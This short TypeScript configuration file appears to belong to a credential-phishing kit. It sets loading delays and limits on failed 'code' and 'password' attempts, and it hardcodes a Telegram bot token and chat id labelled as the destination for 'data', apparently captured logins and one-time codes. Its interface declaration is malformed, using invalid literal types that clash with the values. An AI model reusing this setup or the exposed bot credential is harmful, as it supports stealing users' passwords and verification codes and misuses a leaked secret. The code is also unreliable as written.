interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: -4871887077;
    data_token: 8188654340:AAGxHvJQ2h0Ib0bIhDE3EIE87qfrI6yyVJY;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 5,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "-4871887077",
    data_token: "8188654340:AAGxHvJQ2h0Ib0bIhDE3EIE87qfrI6yyVJY",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
